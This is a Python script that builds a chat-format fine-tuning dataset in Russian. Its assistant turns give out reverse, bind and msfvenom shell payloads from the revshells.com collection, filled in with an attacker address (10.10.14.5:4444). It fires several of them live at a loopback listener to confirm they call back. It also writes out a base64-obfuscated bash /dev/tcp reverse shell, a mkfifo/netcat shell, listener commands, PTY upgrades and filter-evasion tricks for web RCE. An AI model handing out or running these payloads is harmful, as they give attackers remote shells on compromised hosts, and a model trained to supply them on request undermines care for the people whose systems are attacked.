#!/usr/bin/env python3
# Reverse/bind/msfvenom/hoax shell SFT battery, sourced from the maintained revshells.com
# dataset (0dayCTF/reverse-shell-generator js/data.js). Payloads are canonical; placeholders
# {ip}/{port}/{shell} are filled with lab values. A core *nix subset is verified live by
# firing the payload at a loopback listener on this host and confirming the callback.
import json, os, subprocess, socket, time, threading, collections

BASE = "/home/gh0stx/octest/night"
SYS = json.loads(open(f"{BASE}/dataset/at_sft.jsonl").readline())["messages"][0]["content"]
DATA = json.load(open("/tmp/rs_all.json"))
OUT = f"{BASE}/dataset/revshell_battery_sft.jsonl"

LHOST, LPORT, SHELL = "10.10.14.5", "4444", "/bin/sh"
def fill(cmd, shell=SHELL):
    return (cmd.replace("{ip}", LHOST).replace("{port}", LPORT)
               .replace("{shell}", shell).replace("{name}", "shell")
               .replace("{type}", "cmd").replace("{payload}", "<payload>"))

def os_label(meta):
    tags = [m for m in meta if m in ("linux", "mac", "windows", "bsd", "solaris")]
    return ", ".join(tags) if tags else "generic"

# ---- live loopback verification for a core *nix subset ----
def verify_loopback(cmd_template, shell="/bin/sh", timeout=6):
    """Fire the payload at a local listener; return True if it connects back and a shell runs."""
    got = {"conn": False, "id": False}
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0)); port = srv.getsockname()[1]; srv.listen(1); srv.settimeout(timeout)
    def serve():
        try:
            c, _ = srv.accept(); got["conn"] = True
            c.settimeout(3)
            try:
                c.sendall(b"id\n"); time.sleep(0.6)
                if b"uid=" in c.recv(4096): got["id"] = True
            except Exception: pass
            c.close()
        except Exception: pass
    t = threading.Thread(target=serve, daemon=True); t.start()
    payload = (cmd_template.replace("{ip}", "127.0.0.1").replace("{port}", str(port))
                           .replace("{shell}", shell))
    p = subprocess.Popen(["bash", "-c", payload], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         preexec_fn=os.setsid)
    t.join(timeout + 1)
    try: os.killpg(os.getpgid(p.pid), 9)
    except Exception: pass
    srv.close()
    return got["conn"], got["id"]

# names in the reverse set that are runnable on this Linux host -> verify live
LIVE = {"Bash -i", "Bash 196", "Bash read line", "nc mkfifo", "Perl", "Python3 #1",
        "Ruby #1", "socat #1", "PHP cmd"}
verified = {}

exs = []
def add(user, assistant, meta):
    exs.append({"messages": [{"role": "system", "content": SYS},
                             {"role": "user", "content": user},
                             {"role": "assistant", "content": assistant}],
                "meta": {"domain": "revshell", **meta}})

LISTENER = "nc -lvnp {p}   # или: ncat -lvnp {p} | rlwrap nc -lvnp {p} | pwncat-cs -lp {p} | msfconsole -q -x 'use multi/handler;set payload <p>;set LHOST 0.0.0.0;set LPORT {p};run'".replace("{p}", LPORT)

# ---- reverse shells ----
for e in DATA["reverse"]:
    name, meta = e["name"], e.get("meta", [])
    shell = "bash" if "bash" in name.lower() else SHELL
    cmd = fill(e["command"], shell)
    osl = os_label(meta)
    web = name.lower().startswith(("php", "p0wny"))
    note = ("Веб-контекст: пейлоад идёт в RCE/webshell; в браузере/URL — URL-энкодить." if web
            else f"На атакующем поднять listener: `{LISTENER.split('#')[0].strip()}`.")
    vtag = ""
    if name in LIVE:
        conn, idok = verify_loopback(e["command"], shell)
        verified[name] = (conn, idok)
        if conn: vtag = f"\nПроверено на этом хосте: коннект на listener прошёл{' , shell исполняет `id`' if idok else ''}."
    body = f"`{name}` (OS: {osl}):\n```\n{cmd}\n```\n{note}{vtag}"
    q = (f"Дай reverse shell {name} для {osl.split(',')[0]}." if not web
         else f"Нужен PHP reverse shell ({name}) для веб-RCE.")
    add(q, body, {"kind": "reverse", "name": name, "os": osl})
    # second phrasing for common ones
    if name in LIVE or web:
        add(f"reverse shell через {name.split()[0].lower()} на {LHOST}:{LPORT}", body,
            {"kind": "reverse", "name": name, "os": osl, "variant": 2})

# ---- bind shells ----
for e in DATA["bind"]:
    name, meta = e["name"], e.get("meta", [])
    cmd = fill(e["command"])
    add(f"Дай bind shell {name} ({os_label(meta)}).",
        f"`{name}` — bind shell (слушает на цели, атакующий подключается):\n```\n{cmd}\n```\n"
        f"Подключение с атакующего: `nc {LHOST} {LPORT}` (замени на IP цели). Bind годится, когда исходящие с цели фильтруются, а входящие на порт — нет.",
        {"kind": "bind", "name": name})

# ---- msfvenom ----
for e in DATA["msfvenom"]:
    name = e["name"]; cmd = fill(e["command"])
    add(f"msfvenom: собери payload {name}.",
        f"`{name}`:\n```\n{cmd}\n```\nПринимать в `msfconsole` через `multi/handler` с тем же payload/LHOST/LPORT.",
        {"kind": "msfvenom", "name": name})

# ---- hoax + assembled ----
for grp in ("hoax", "assembled"):
    for e in DATA[grp]:
        name = e["name"]; cmd = fill(e["command"])
        add(f"{name} — покажи вариант.",
            f"`{name}`:\n```\n{cmd}\n```",
            {"kind": grp, "name": name})

# ---- cross-cutting workflow ----
add("Как поднять listener под reverse shell?",
    "Базовый TCP listener на атакующем:\n```\nnc -lvnp 4444            # голый netcat\nncat -lvnp 4444           # ncat, с --ssl для TLS\nrlwrap nc -lvnp 4444      # + история/стрелки\npwncat-cs -lp 4444        # авто-стабилизация PTY\nmsfconsole -q -x 'use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run'\n```\nПорт под egress-фильтр бери разрешённый наружу — 443 или 53.",
    {"kind": "listener"})
add("Как из тупого reverse shell сделать нормальный PTY?",
    "Апгрейд dumb shell до полноценного TTY:\n```\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n# затем Ctrl-Z\nstty raw -echo; fg\n# в шелле:\nexport TERM=xterm; export SHELL=/bin/bash\nstty rows 40 columns 160\n```\nАльтернатива без python: `script -qc /bin/bash /dev/null`. Даёт job control, Ctrl-C, автодополнение, редакторы.",
    {"kind": "pty-upgrade"})
add("Закодируй bash reverse shell в base64 для обхода фильтра кавычек.",
    f"```\nbash -c '{{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ==}}|{{base64,-d}}|bash'\n```\n"
    "Внутри — `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`, завёрнутый в `{echo,<b64>}|{base64,-d}|bash`, чтобы обойти фильтры пробелов и кавычек. Собрать b64: `echo -n 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' | base64 -w0`.",
    {"kind": "encoding"})

# ---- corrections (common broken one-liners) ----
def fix(u, a): add(u, a, {"kind": "correction"})
fix("nc -e /bin/sh 10.10.14.5 4444 выдаёт 'invalid option -- e', как быть?",
    "Сборка netcat без `-e`/`-c` (OpenBSD-netcat, дефолт в Debian/Ubuntu/macOS). Через mkfifo:\n```\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f\n```\nЛибо bash-нативно: `bash -i >& /dev/tcp/10.10.14.5/4444 0>&1`.")
fix("bash reverse shell не коннектит, а sh -i >& /dev/tcp/... тоже молчит.",
    "`/dev/tcp` — фича bash, в `sh`/`dash` её нет, поэтому `sh -i >& /dev/tcp/...` тихо падает. Запускать именно `bash`: `bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'`. Если bash на цели нет — mkfifo+nc или python/perl.")
fix("Запустил reverse shell, но подключения нет.",
    "По частоте: listener не поднят или на другом порту — сперва `nc -lvnp 4444` на атакующем; порт зарезан egress-фильтром — пробуй 443/53; неверный LHOST — укажи адрес атакующего, видимый цели (VPN/tun0, не 127.0.0.1); firewall цели рубит исходящие — тогда bind shell.")
fix("В веб-RCE вставляю bash reverse shell, но кавычки ломают запрос.",
    "В HTTP-параметре пейлоад URL-энкодить и уходить от кавычек: base64-обёртка `bash -c '{echo,<b64>}|{base64,-d}|bash'`, где `<b64>` = `base64 -w0` от `bash -i >& /dev/tcp/IP/PORT 0>&1`. Пробел = `${IFS}` при фильтре пробелов.")

with open(OUT, "w") as f:
    for e in exs:
        f.write(json.dumps(e, ensure_ascii=False) + "\n")
kc = collections.Counter(e["meta"]["kind"] for e in exs)
print("wrote", len(exs), "->", OUT)
print("by kind:", dict(kc))
print("live-verified:", {k: v for k, v in verified.items()})
